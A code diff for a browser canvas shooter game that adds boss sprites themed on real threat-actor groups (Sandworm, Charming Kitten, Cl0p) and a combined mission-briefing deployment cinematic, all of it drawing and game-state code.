+      CX.shadowBlur=BOSS.hf>0?0:12; CX.shadowColor='#ffd84d';
+      CX.font='bold 18px monospace'; CX.textAlign='center';
+      CX.fillText('₿',-2,14);
+      CX.shadowBlur=0;
+      // Supply chain crate (below body)
+      CX.fillStyle='rgba(6,72,64,0.7)'; CX.fillRect(-14,26,28,14);
+      CX.strokeStyle=c; CX.lineWidth=1; CX.strokeRect(-14,26,28,14);
+      // Chain links
+      CX.strokeStyle='rgba(42,240,208,0.5)'; CX.lineWidth=1.2;
+      for(const cx2 of [-7,0,7]){
+        CX.beginPath(); CX.ellipse(cx2,26,3,2,Math.PI/2,0,TAU); CX.stroke();
+      }
+      // Hooves
+      CX.fillStyle='#033028';
+      for(const hx of [-26,-10,8,22]){
+        CX.beginPath(); CX.roundRect(hx-4,26,8,6,2); CX.fill();
+      }
+      break;
+    }
+
+    case 'VOODOO BEAR': {
+      // Sandworm/GRU — Power grid destroyer: 6-point star + lightning bolts + destruction rings
+      // Expanding destruction rings (animated via BOSS.t)
+      const ringPhase=(BOSS.t*38)%62;
+      const ringSpeed=BOSS.phase>=2?2:1;
+      for(let ri=0;ri<3;ri++){
+        const rr=((BOSS.t*38*ringSpeed+ri*21)%62);
+        CX.globalAlpha=(1-rr/62)*0.28;
+        CX.strokeStyle=c; CX.lineWidth=2.5;
+        CX.beginPath(); CX.arc(0,0,rr,0,TAU); CX.stroke();
+      }
+      CX.globalAlpha=1;
+      // Grid cross pattern (power grid motif)
+      CX.strokeStyle='rgba(200,80,255,0.12)'; CX.lineWidth=1;
+      for(let gx=-48;gx<=48;gx+=16){ CX.beginPath(); CX.moveTo(gx,-48); CX.lineTo(gx,48); CX.stroke(); }
+      for(let gy=-48;gy<=48;gy+=16){ CX.beginPath(); CX.moveTo(-48,gy); CX.lineTo(48,gy); CX.stroke(); }
+      // 6-pointed power grid star
+      CX.fillStyle=c;
+      CX.beginPath();
+      for(let i=0;i<6;i++){
+        const ao=i/6*TAU-Math.PI/2, ai=(i+0.5)/6*TAU-Math.PI/2;
+        if(i===0) CX.moveTo(Math.cos(ao)*56,Math.sin(ao)*44);
+        else CX.lineTo(Math.cos(ao)*56,Math.sin(ao)*44);
+        CX.lineTo(Math.cos(ai)*24,Math.sin(ai)*20);
+      }
+      CX.closePath(); CX.fill();
+      CX.fillStyle='rgba(200,80,255,0.25)'; CX.fill();
+      CX.strokeStyle='#e090ff'; CX.lineWidth=2; CX.stroke();
+      // Lightning bolt arms radiating from star tips (6 bolts)
+      CX.strokeStyle=BOSS.hf>0?'#fff':'rgba(230,160,255,0.8)'; CX.lineWidth=1.8;
+      for(let i=0;i<6;i++){
+        const ao=i/6*TAU-Math.PI/2;
+        const baseX=Math.cos(ao)*56, baseY=Math.sin(ao)*44;
+        const tipX=Math.cos(ao)*78, tipY=Math.sin(ao)*62;
+        const midX=(baseX+tipX)/2+Math.cos(ao+Math.PI/2)*8*Math.sin(BOSS.t*3+i);
+        const midY=(baseY+tipY)/2+Math.sin(ao+Math.PI/2)*8*Math.sin(BOSS.t*3+i);
+        CX.beginPath(); CX.moveTo(baseX,baseY); CX.lineTo(midX,midY); CX.lineTo(tipX,tipY); CX.stroke();
+      }
+      // Destruction cross lines
+      CX.strokeStyle='rgba(200,80,255,0.45)'; CX.lineWidth=1.5;
+      CX.beginPath(); CX.moveTo(-54,-36); CX.lineTo(54,36); CX.moveTo(54,-36); CX.lineTo(-54,36); CX.stroke();
+      // Inner destruction core (pulsing red)
+      const coreAlpha=0.7+0.3*Math.sin(BOSS.t*4);
+      CX.fillStyle=`rgba(255,32,32,${coreAlpha})`; CX.beginPath(); CX.arc(0,0,16,0,TAU); CX.fill();
+      CX.fillStyle='rgba(255,140,255,0.6)'; CX.beginPath(); CX.arc(0,0,8,0,TAU); CX.fill();
+      // Phase 2: extra red overlay tint
+      if(BOSS.phase>=2){
+        CX.globalAlpha=0.18; CX.fillStyle='#ff0000';
+        CX.beginPath(); CX.arc(0,0,56,0,TAU); CX.fill();
+        CX.globalAlpha=1;
+      }
+      break;
+    }
+
+    case 'STAR KITTEN': {
+      // Charming Kitten/IRGC/APT35 — Surveillance cat face with whisker antenna arrays
+      // Cat body ellipse
+      CX.fillStyle=c; CX.beginPath(); CX.ellipse(0,5,50,28,0,0,TAU); CX.fill();
+      // Triangle ears
+      for(const sx of [-1,1]){
+        CX.fillStyle=c;
+        CX.beginPath(); CX.moveTo(sx*20,-24); CX.lineTo(sx*44,-48); CX.lineTo(sx*38,-22); CX.closePath(); CX.fill();
+        // Inner ear
+        CX.fillStyle='#c87000';
+        CX.beginPath(); CX.moveTo(sx*23,-26); CX.lineTo(sx*40,-44); CX.lineTo(sx*36,-24); CX.closePath(); CX.fill();
+      }
+      // Fur cheek puffs
+      CX.fillStyle='rgba(255,180,80,0.35)';
+      CX.beginPath(); CX.ellipse(-28,12,14,9,0,0,TAU); CX.fill();
+      CX.beginPath(); CX.ellipse(28,12,14,9,0,0,TAU); CX.fill();
+      // Eyes (amber cat eyes with slit pupils)
+      const pupilH=3.5+2.5*Math.abs(Math.sin(BOSS.t*0.8)); // pupils contract/expand
+      for(const ex of [-18,18]){
+        // Iris
+        CX.fillStyle='#e09000'; CX.beginPath(); CX.ellipse(ex,2,11,8,0,0,TAU); CX.fill();
+        CX.strokeStyle='rgba(255,180,0,0.7)'; CX.lineWidth=1; CX.stroke();
+        // Inner iris ring
+        CX.strokeStyle='rgba(220,120,0,0.5)'; CX.lineWidth=0.8;
+        CX.beginPath(); CX.ellipse(ex,2,7,5,0,0,TAU); CX.stroke();
+        // Slit pupil
+        CX.fillStyle='#000'; CX.beginPath(); CX.ellipse(ex,2,2.2,pupilH,0,0,TAU); CX.fill();
+        // Highlight
+        CX.fillStyle='rgba(255,255,255,0.6)'; CX.beginPath(); CX.arc(ex-2,0,2,0,TAU); CX.fill();
+      }
+      // Nose
+      CX.fillStyle='#ff6060'; CX.beginPath();
+      CX.moveTo(0,14); CX.lineTo(-4,10); CX.lineTo(4,10); CX.closePath(); CX.fill();
+      // Mouth
+      CX.strokeStyle='#c84000'; CX.lineWidth=1.2;
+      CX.beginPath(); CX.moveTo(-4,14); CX.quadraticCurveTo(-8,20,-6,21); CX.stroke();
+      CX.beginPath(); CX.moveTo(4,14);  CX.quadraticCurveTo(8,20,6,21);   CX.stroke();
+      // Whisker surveillance antenna arrays (4 per side, pulsing)
+      const whiskerW=1+0.5*Math.sin(BOSS.t*3);
+      CX.strokeStyle='rgba(255,200,100,0.65)'; CX.lineWidth=whiskerW;
+      const whiskers=[[-6,-2,-54,-6],[-6,6,-52,12],[-6,12,-50,20],[-6,16,-48,26],
+                       [6,-2,54,-6],[6,6,52,12],[6,12,50,20],[6,16,48,26]];
+      whiskers.forEach(([x1,y1,x2,y2])=>{
+        CX.beginPath(); CX.moveTo(x1,y1); CX.lineTo(x2,y2); CX.stroke();
+      });
+      // IRGC sonar ping (from nose area)
+      const pingR=((BOSS.t*22)%44);
+      CX.globalAlpha=(1-pingR/44)*0.4;
+      CX.strokeStyle='#ffaa00'; CX.lineWidth=1.2;
+      CX.beginPath(); CX.arc(0,14,pingR,-Math.PI*0.6,-Math.PI*0.4); CX.stroke();
+      CX.globalAlpha=1;
+      // Outline
+      CX.strokeStyle=c; CX.lineWidth=1.5;
+      CX.beginPath(); CX.ellipse(0,5,50,28,0,0,TAU); CX.stroke();
+      break;
+    }
+
+    case 'ECLIPSE SPIDER': {
+      // MOVEit/Cl0p — Massive 10-arm spider with dual scanning beams + exfil data packets
+      // Scanning beams (two counter-rotating, wide screen sweep)
+      const scanA=BOSS.t*1.22;
+      const scanB=BOSS.t*(-0.8)+2.1;
+      CX.strokeStyle='rgba(255,144,96,0.16)'; CX.lineWidth=2;
+      CX.beginPath(); CX.moveTo(0,0); CX.lineTo(Math.cos(scanA)*220,Math.sin(scanA)*150); CX.stroke();
+      CX.beginPath(); CX.moveTo(0,0); CX.lineTo(Math.cos(scanA+Math.PI)*220,Math.sin(scanA+Math.PI)*150); CX.stroke();
+      CX.strokeStyle='rgba(255,180,100,0.1)'; CX.lineWidth=2;
+      CX.beginPath(); CX.moveTo(0,0); CX.lineTo(Math.cos(scanB)*220,Math.sin(scanB)*150); CX.stroke();
+      CX.beginPath(); CX.moveTo(0,0); CX.lineTo(Math.cos(scanB+Math.PI)*220,Math.sin(scanB+Math.PI)*150); CX.stroke();
+      // 10 spider arms with data exfil rects at tips
+      CX.strokeStyle=c; CX.lineWidth=4+BOSS.phase;
+      for(let i=0;i<10;i++){
+        const a=(i/10*TAU)-Math.PI/2;
+        const jit=Math.sin(BOSS.t*1.4+i*0.7)*6;
+        const endX=Math.cos(a)*(88+BOSS.phase*14), endY=Math.sin(a)*(60+BOSS.phase*14)+jit;
+        const midX=Math.cos(a)*64+rnd(-6,6), midY=Math.sin(a)*42+jit*0.5;
+        CX.beginPath(); CX.moveTo(Math.cos(a)*52,Math.sin(a)*32); CX.quadraticCurveTo(midX,midY,endX,endY); CX.stroke();
+        // Data exfil packet rect at arm tip
+        CX.save(); CX.translate(endX,endY);
+        CX.fillStyle='rgba(255,120,60,0.6)'; CX.fillRect(-5,-4,10,8);
+        CX.strokeStyle='rgba(255,180,100,0.7)'; CX.lineWidth=0.8; CX.strokeRect(-5,-4,10,8);
+        // Data flow lines inside packet
+        CX.strokeStyle='rgba(255,200,150,0.5)'; CX.lineWidth=0.5;
+        CX.beginPath(); CX.moveTo(-4,-1); CX.lineTo(4,-1); CX.stroke();
+        CX.beginPath(); CX.moveTo(-4,2); CX.lineTo(4,2); CX.stroke();
+        CX.restore();
+      }
+      // Body radial glow
+      const coreGrad=CX.createRadialGradient(0,0,8,0,0,50);
+      coreGrad.addColorStop(0,'rgba(255,200,150,0.9)');
+      coreGrad.addColorStop(0.4,'rgba(255,100,60,0.6)');
+      coreGrad.addColorStop(1,'rgba(255,80,40,0.0)');
+      CX.fillStyle=coreGrad; CX.beginPath(); CX.arc(0,0,50,0,TAU); CX.fill();
+      // Body
+      CX.fillStyle=c; CX.beginPath(); CX.ellipse(0,0,52,33,0,0,TAU); CX.fill();
+      // Outer ring
+      CX.strokeStyle='rgba(255,200,140,0.5)'; CX.lineWidth=2;
+      CX.beginPath(); CX.ellipse(0,0,52,33,0,0,TAU); CX.stroke();
+      // Inner core glow
+      CX.fillStyle='rgba(255,200,100,0.32)';
+      CX.beginPath(); CX.ellipse(0,0,30,20,0,0,TAU); CX.fill();
+      // CLOP hexagonal badge
+      CX.fillStyle='rgba(40,10,0,0.85)';
+      CX.beginPath();
+      for(let hi=0;hi<6;hi++){ const ha=hi/6*TAU-Math.PI/2; if(hi===0) CX.moveTo(Math.cos(ha)*18,Math.sin(ha)*16); else CX.lineTo(Math.cos(ha)*18,Math.sin(ha)*16); }
+      CX.closePath(); CX.fill();
+      CX.strokeStyle='rgba(255,144,96,0.7)'; CX.lineWidth=1.2; CX.stroke();
+      CX.fillStyle='#fff'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('CLOP',0,3);
+      // Orbiting data packets
+      for(let pi=0;pi<8;pi++){
+        const pa=BOSS.t*0.9+pi/8*TAU;
+        const pr=38+Math.sin(BOSS.t+pi)*5;
+        const px=Math.cos(pa)*pr, py=Math.sin(pa)*pr*0.65;
+        CX.globalAlpha=0.6+0.3*Math.sin(BOSS.t*3+pi);
+        CX.fillStyle=c; CX.fillRect(px-3,py-3,6,6);
+        CX.globalAlpha=1;
+      }
+      break;
+    }
 
     default:
       CX.fillStyle=c; CX.fillRect(-BOSS.w/2,-BOSS.h/2,BOSS.w,BOSS.h);
@@ -11478,6 +13184,269 @@ function drawPhaseIntro(){
   CX.restore();
 }
 
+// ── Screen: Deploy Cinematic (Combined Briefing + Insertion) ──────────
+// ARCH: Single pre-gameplay screen combining phase briefing + cinematic deployment.
+// This replaces the old TITLE → PHASE_INTRO → DEPLOY_CINEMATIC three-screen flow.
+// t = window._deployT (seconds, from initPhase reset).
+// Timeline:
+//   0.0–0.4  FLASH   — white burst → black
+//   0.4–1.4  BOOT    — typewriter op-name + adversary on black w/ scanlines
+//   1.4–2.4  REVEAL  — black veil dissolves; briefing panel slides in left
+//   2.4+     LIVE    — full briefing panel LEFT; river action RIGHT; SPACE prompt
+//   5.5      AUTO    — auto-transition to PLAYING if player hasn't pressed SPACE
+function drawDeployCinematic(){
+  const t=window._deployT||0;
+  const cx=VW/2;
+
+  // Gather briefing data (same as drawPhaseIntro)
+  const ph=PHASES[phIdx], ad=ph.adversary?ADV[ph.adversary]:null, act=getAct(phIdx);
+  const phaseKey=ph.id===0?T('iz_phase0_key'):ph.key;
+  const phaseSeason=ph.id===0?T('iz_phase0_season'):ph.season;
+  const phaseSummary=ph.id===0?T('iz_phase0_summary'):ph.summary;
+  const phaseMission=ph.id===0?T('iz_phase0_mission'):ph.mission;
+  const phaseObjectives=ph.id===0
+    ? [{text:T('iz_phase0_obj1')},{text:T('iz_phase0_obj2')}]
+    : ph.objectives;
+  const locAct=localizeIZAct(act);
+
+  // Always render world as base layer (boat positioned by update loop)
+  drawWorld(0.016);
+  if(t>1.4) drawPlayer();
+
+  CX.save();
+  CX.textAlign='center';
+
+  // ── Phase: FLASH (0–0.4s) ──────────────────────────────────────────
+  if(t<0.4){
+    const flashAlpha=Math.max(0,1-(t/0.12));
+    const blackAlpha=Math.min(1,t/0.28);
+    CX.fillStyle='#000'; CX.globalAlpha=blackAlpha; CX.fillRect(0,0,VW,VH);
+    CX.fillStyle='#fff'; CX.globalAlpha=flashAlpha; CX.fillRect(0,0,VW,VH);
+    CX.globalAlpha=1;
+  }
+
+  // ── Phase: BOOT (0.4–1.4s) — black screen with op/adversary typewriter ─
+  if(t>=0.4&&t<1.4){
+    const bootP=Math.min(1,(t-0.4)/0.8);
+    CX.globalAlpha=1;
+    CX.fillStyle='#000'; CX.fillRect(0,0,VW,VH);
+    // Red scanning bar
+    CX.fillStyle='rgba(220,48,48,0.9)'; CX.fillRect(0,0,VW*bootP,3);
+    // Scanlines
+    CX.globalAlpha=0.06;
+    for(let sy=0;sy<VH;sy+=4){ CX.fillStyle='#fff'; CX.fillRect(0,sy,VW,1); }
+    CX.globalAlpha=1;
+    // Centre crosshair
+    const ch=bootP*bootP;
+    CX.save();
+    CX.globalAlpha=ch*0.35; CX.strokeStyle='#ff3030'; CX.lineWidth=1;
+    CX.beginPath(); CX.moveTo(cx-50,VH/2); CX.lineTo(cx+50,VH/2); CX.stroke();
+    CX.beginPath(); CX.moveTo(cx,VH/2-35); CX.lineTo(cx,VH/2+35); CX.stroke();
+    CX.globalAlpha=ch*0.22; CX.beginPath(); CX.arc(cx,VH/2,40,0,TAU); CX.stroke();
+    CX.restore();
+    // Operation name typewriter (large)
+    const revealed=Math.floor(phaseKey.length*bootP);
+    const displayText=phaseKey.slice(0,revealed)+(bootP<1&&Math.floor(Date.now()/220)%2===0?'█':'');
+    CX.globalAlpha=Math.min(1,bootP*2.2);
+    CX.font='bold 22px monospace'; CX.fillStyle=ph.col;
+    CX.shadowBlur=20; CX.shadowColor=ph.col+'88';
+    CX.fillText(displayText,cx,VH/2-8); CX.shadowBlur=0;
+    // Adversary line fades in at bootP>0.55
+    if(bootP>0.55&&ad){
+      const subA=Math.min(1,(bootP-0.55)*4.5);
+      CX.globalAlpha=subA; CX.font='bold 13px monospace'; CX.fillStyle=ad.color;
+      CX.shadowBlur=10; CX.shadowColor=ad.color;
+      CX.fillText(T('g_adversary_prefix')+ph.adversary,cx,VH/2+18); CX.shadowBlur=0;
+      CX.globalAlpha=subA*0.6; CX.font='10px monospace'; CX.fillStyle='#aaa';
+      CX.fillText(ad?ad.nation:'',cx,VH/2+34);
+    }
+    CX.globalAlpha=0.35; CX.fillStyle='#555'; CX.font='10px monospace';
+    CX.fillText('▰▰▰▱▱▱▱▱',cx,VH-22); CX.globalAlpha=1;
+  }
+
+  // ── Phase: REVEAL (1.4–2.4s) — black veil lifts, briefing panel slides in ─
+  if(t>=1.4&&t<2.4){
+    const revP=Math.min(1,(t-1.4)/0.9);
+    const veilAlpha=Math.max(0,1-revP*1.5);
+    CX.globalAlpha=veilAlpha; CX.fillStyle='#000'; CX.fillRect(0,0,VW,VH); CX.globalAlpha=1;
+    // Corner brackets
+    if(revP>0.25){
+      const hudA=Math.min(1,(revP-0.25)/0.35);
+      CX.globalAlpha=hudA*0.55; CX.strokeStyle='#ff3030'; CX.lineWidth=2;
+      const m=14,s=28;
+      CX.beginPath();
+      CX.moveTo(m+s,m); CX.lineTo(m,m); CX.lineTo(m,m+s);
+      CX.moveTo(VW-m-s,m); CX.lineTo(VW-m,m); CX.lineTo(VW-m,m+s);
+      CX.moveTo(m+s,VH-m); CX.lineTo(m,VH-m); CX.lineTo(m,VH-m-s);
+      CX.moveTo(VW-m-s,VH-m); CX.lineTo(VW-m,VH-m); CX.lineTo(VW-m,VH-m-s);
+      CX.stroke(); CX.globalAlpha=1;
+    }
+    // Op name persists at top-left during reveal
+    if(revP>0.4){
+      const nameA=Math.min(1,(revP-0.4)*4);
+      CX.globalAlpha=nameA;
+      CX.font='bold 13px monospace'; CX.fillStyle=ph.col; CX.textAlign='left';
+      CX.shadowBlur=10; CX.shadowColor=ph.col+'88';
+      CX.fillText(phaseKey,22,50); CX.shadowBlur=0;
+      if(ad){ CX.font='bold 11px monospace'; CX.fillStyle=ad.color; CX.fillText(T('g_adversary_prefix')+ph.adversary,22,66); }
+      CX.textAlign='center'; CX.globalAlpha=1;
+    }
+    CX.globalAlpha=0.45; CX.fillStyle='#777'; CX.font='10px monospace';
+    CX.fillText('▰▰▰▰▰▱▱▱',cx,VH-22); CX.globalAlpha=1;
+  }
+
+  // ── Phase: LIVE (t>=2.4s) — full briefing panel LEFT + tactical overlay RIGHT ─
+  if(t>=2.4){
+    const liveP=Math.min(1,(t-2.4)/0.7); // 0→1 over 0.7s (slide-in ease)
+    const panSlide=Math.max(0,1-liveP); // 0=fully visible, 1=off screen
+    const panAlpha=Math.min(1,liveP*2);
+
+    // Briefing panel (slides in from left)
+    const pw=Math.min(VW*0.48,440);
+    const ph2=VH-48;
+    const panX=20-pw*panSlide;
+    const panY=24;
+
+    CX.save();
+    CX.globalAlpha=panAlpha;
+
+    // Panel background
+    CX.fillStyle='rgba(2,6,10,0.92)';
+    CX.beginPath(); CX.roundRect(panX,panY,pw,ph2,4); CX.fill();
+    CX.strokeStyle=ph.col; CX.lineWidth=1.8;
+    CX.beginPath(); CX.roundRect(panX,panY,pw,ph2,4); CX.stroke();
+
+    // Act badge row
+    CX.fillStyle='rgba(0,0,0,0.8)';
+    CX.fillRect(panX,panY,pw,20);
+    CX.fillStyle=act.col; CX.font='bold 9px monospace'; CX.textAlign='left';
+    CX.fillText(T('g_act')+act.num+': '+locAct.title.toUpperCase()+'  —  '+locAct.subtitle,panX+8,panY+13);
+
+    // Phase number + season
+    CX.fillStyle='#7f8b96'; CX.font='9px monospace';
+    CX.fillText(T('g_phase')+(phIdx+1)+'/10  ·  '+phaseSeason,panX+8,panY+33);
+
+    // Operation name
+    CX.shadowBlur=14; CX.shadowColor=ph.col;
+    CX.fillStyle=ph.col; CX.font='bold 15px monospace';
+    CX.fillText(phaseKey,panX+8,panY+52); CX.shadowBlur=0;
+
+    // Adversary
+    if(ad){
+      CX.shadowBlur=8; CX.shadowColor=ad.color;
+      CX.fillStyle=ad.color; CX.font='bold 11px monospace';
+      CX.fillText(T('g_adversary_prefix')+ph.adversary,panX+8,panY+70); CX.shadowBlur=0;
+      CX.fillStyle='#888'; CX.font='9px monospace';
+      CX.fillText(ad.nation,panX+8,panY+82);
+    }
+
+    // Divider
+    CX.strokeStyle='rgba(255,255,255,0.07)'; CX.lineWidth=1;
+    CX.beginPath(); CX.moveTo(panX+8,panY+90); CX.lineTo(panX+pw-8,panY+90); CX.stroke();
+
+    // Situation
+    CX.fillStyle='#ffd84d'; CX.font='bold 9px monospace';
+    CX.fillText(T('g_situation'),panX+8,panY+102);
+    CX.fillStyle='#c8d4dc'; CX.font='9px monospace';
+    const sumLines=wrapTextPx(CX, phaseSummary, pw-18);
+    sumLines.slice(0,3).forEach((l,i)=>CX.fillText(l,panX+8,panY+113+i*12));
+
+    // Mission
+    const mBase=panY+113+Math.min(sumLines.length,3)*12+8;
+    CX.fillStyle='#ffd84d'; CX.font='bold 9px monospace';
+    CX.fillText(T('g_mission'),panX+8,mBase);
+    CX.fillStyle='#74ff88'; CX.font='9px monospace';
+    const misLines=wrapTextPx(CX, phaseMission, pw-18);
+    misLines.slice(0,2).forEach((l,i)=>CX.fillText(l,panX+8,mBase+11+i*12));
+
+    // Objectives
+    const oBase=mBase+11+Math.min(misLines.length,2)*12+8;
+    CX.fillStyle='#ffd84d'; CX.font='bold 9px monospace';
+    CX.fillText(T('g_objectives'),panX+8,oBase);
+    phaseObjectives.forEach((o,i)=>{
+      CX.fillStyle='#42d9ff'; CX.font='9px monospace';
+      CX.fillText('○ '+o.text.slice(0,46),panX+8,oBase+11+i*13);
+    });
+
+    // TTPs + Counter
+    if(ad){
+      const tBase=oBase+11+phaseObjectives.length*13+6;
+      CX.strokeStyle='rgba(255,255,255,0.05)'; CX.lineWidth=1;
+      CX.beginPath(); CX.moveTo(panX+8,tBase-3); CX.lineTo(panX+pw-8,tBase-3); CX.stroke();
+      CX.fillStyle='#666'; CX.font='8px monospace';
+      CX.fillText(T('iz_known_ttps')+ad.ttp.slice(0,52),panX+8,tBase+8);
+      CX.fillStyle='rgba(66,217,255,0.08)'; CX.fillRect(panX+8,tBase+12,pw-16,32);
+      CX.strokeStyle='rgba(66,217,255,0.18)'; CX.strokeRect(panX+8,tBase+12,pw-16,32);
+      CX.fillStyle='#42d9ff'; CX.font='bold 9px monospace';
+      CX.fillText(T('g_counter')+ad.counter.slice(0,50),panX+8,tBase+24);
+      CX.fillStyle='#74ff88'; CX.font='bold 9px monospace';
+      CX.fillText(T('g_featured_module')+ph.module,panX+8,tBase+38);
+    }
+
+    // Boss warning banner at bottom of panel
+    if(ph.boss){
+      CX.fillStyle='rgba(255,80,50,0.14)'; CX.fillRect(panX,panY+ph2-36,pw,36);
+      CX.strokeStyle='rgba(255,80,50,0.35)'; CX.strokeRect(panX,panY+ph2-36,pw,36);
+      CX.fillStyle='#ff5a4d'; CX.font='bold 9px monospace';
+      CX.fillText(T('g_boss_encounter')+ph.boss+'  —  '+(ADV[ph.boss]?.nation||''),panX+8,panY+ph2-16);
+    }
+
+    CX.restore(); // restore globalAlpha
+
+    // ── Tactical grid overlay (right half) ─────────────────────────────
+    CX.globalAlpha=Math.min(0.05,liveP*0.05);
+    CX.strokeStyle='#42d9ff'; CX.lineWidth=0.5;
+    const gStep=38;
+    for(let gx=pw+30;gx<VW;gx+=gStep){ CX.beginPath(); CX.moveTo(gx,0); CX.lineTo(gx,VH); CX.stroke(); }
+    for(let gy=0;gy<VH;gy+=gStep){ CX.beginPath(); CX.moveTo(pw+30,gy); CX.lineTo(VW,gy); CX.stroke(); }
+    CX.globalAlpha=1;
+
+    // ── HUD corner brackets ────────────────────────────────────────────
+    CX.globalAlpha=liveP*0.5; CX.strokeStyle='#ff3030'; CX.lineWidth=1.8;
+    const m=14, s=26;
+    CX.beginPath();
+    CX.moveTo(m+s,m); CX.lineTo(m,m); CX.lineTo(m,m+s);
+    CX.moveTo(VW-m-s,m); CX.lineTo(VW-m,m); CX.lineTo(VW-m,m+s);
+    CX.moveTo(m+s,VH-m); CX.lineTo(m,VH-m); CX.lineTo(m,VH-m-s);
+    CX.moveTo(VW-m-s,VH-m); CX.lineTo(VW-m,VH-m); CX.lineTo(VW-m,VH-m-s);
+    CX.stroke(); CX.globalAlpha=1;
+
+    // ── "WEAPONS FREE" label — top right of river area ─────────────────
+    const wpA=Math.min(1,(t-2.9)*3);
+    if(wpA>0){
+      CX.globalAlpha=wpA;
+      CX.font='bold 14px monospace'; CX.fillStyle='#74ff88';
+      CX.shadowBlur=14; CX.shadowColor='#74ff88aa';
+      CX.fillText(T('iz_deploy_weapons'),VW*0.78,52); CX.shadowBlur=0;
+      CX.globalAlpha=wpA*0.65; CX.font='10px monospace'; CX.fillStyle='#42d9ff';
+      CX.fillText(T('iz_deploy_asset'),VW*0.78,66);
+      CX.globalAlpha=1;
+    }
+
+    // ── PRESS SPACE prompt blinks after t>=3.5s ─────────────────────────
+    if(t>=3.5){
+      const promptA=Math.min(1,(t-3.5)*2.5);
+      if(promptA>0&&Math.floor(Date.now()/440)%2===0){
+        CX.globalAlpha=promptA;
+        CX.font='bold 12px monospace'; CX.fillStyle='#ffffff';
+        CX.shadowBlur=16; CX.shadowColor='rgba(255,255,255,0.6)';
+        CX.fillText(T('g_press_deploy'),VW*0.76,VH-30); CX.shadowBlur=0;
+        CX.globalAlpha=1;
+      }
+    }
+
+    // Progress bar (bottom strip)
+    const prog=Math.min(1,(t-2.4)/3.1);
+    CX.globalAlpha=0.4; CX.fillStyle='#333';
+    CX.fillRect(pw+40,VH-8,VW-pw-50,4);
+    CX.fillStyle=ph.col; CX.fillRect(pw+40,VH-8,(VW-pw-50)*prog,4);
+    CX.globalAlpha=1;
+  }
+
+  CX.textAlign='left';
+  CX.restore();
+}
+
 // ── Screen: Boss Intro ────────────────────────────────────────────────
 function drawBossIntro(){
   drawWorld(0.04);
@@ -11744,14 +13713,16 @@ function drawPause(){
 function render(dt){
   CX.save(); applyShake();
   switch(STATE){
-    case S.TITLE:       drawTitle();      break;
-    case S.PHASE_INTRO: drawPhaseIntro(); break;
-    case S.BOSS_INTRO:  drawBossIntro();  break;
+    case S.TITLE:            drawTitle();           break;
+    case S.PHASE_INTRO:      drawPhaseIntro();      break;
+    case S.DEPLOY_CINEMATIC: drawDeployCinematic(); break;
+    case S.BOSS_INTRO:       drawBossIntro();       break;
     case S.PHASE_END:   drawPhaseEnd();   break;
     case S.GAME_OVER:   drawGameOver();   break;
     case S.WIN:         drawWin();        break;
     default:
       drawWorld(dt);
+      drawBillboards();
       drawGround();
       drawBridges();
       drawFuelBarges();
@@ -11803,16 +13774,31 @@ function frame(ts){
   switch(STATE){
 
     case S.TITLE:
+      // ARCH: TITLE is now absorbed into DEPLOY_CINEMATIC.
+      // One-frame pass-through: init a fresh game and enter the unified cinematic.
       if(hk('KeyM')) MUTED=!MUTED;
-      if(hk('KeyL')) FalconRanking.showAttract();
-      if(hk('Space')){ AC(); SFX.act(0); startGame(); }
-      updShake(dt); updParts(dt); updBanner(dt); updActAnn(dt);
+      AC(); startGame(); // startGame sets window._deployT=0, STATE=DEPLOY_CINEMATIC
       break;
 
     case S.PHASE_INTRO:
-      phTime+=dt; // Must increment for fade-in (globalAlpha = phTime/0.55)
-      updShake(dt); updParts(dt); updBanner(dt); updActAnn(dt);
-      if(hk('Space')){ SFX.scan(); STATE=S.PLAYING; }
+      // ARCH: PHASE_INTRO is now a pass-through — briefing is embedded in DEPLOY_CINEMATIC.
+      // This case fires only if somehow STATE=PHASE_INTRO is set directly (e.g. hot-reload).
+      phTime+=dt;
+      window._deployT=0; STATE=S.DEPLOY_CINEMATIC;
+      break;
+
+    case S.DEPLOY_CINEMATIC:
+      window._deployT=(window._deployT||0)+dt;
+      updShake(dt); updParts(dt); updActAnn(dt);
+      // Animate player boat dropping into position during REVEAL phase (t=1.4-2.5)
+      if(window._deployT<4.3){
+        const dEase=Math.min(1,Math.max(0,(window._deployT-1.4)/1.1));
+        const dEase2=dEase*dEase; // quadratic ease-in (slow start)
+        PL.y=-80+dEase2*(VH*0.72);
+        PL.x=VW/2+40; // offset right of center so briefing panel has space
+      }
+      // SPACE after t>=1.5 skips directly to gameplay; auto-exit after 5.5s
+      if(window._deployT>=5.5||(window._deployT>=1.5&&hk('Space'))){ SFX.scan(); STATE=S.PLAYING; }
       break;
 
     case S.BOSS_INTRO:
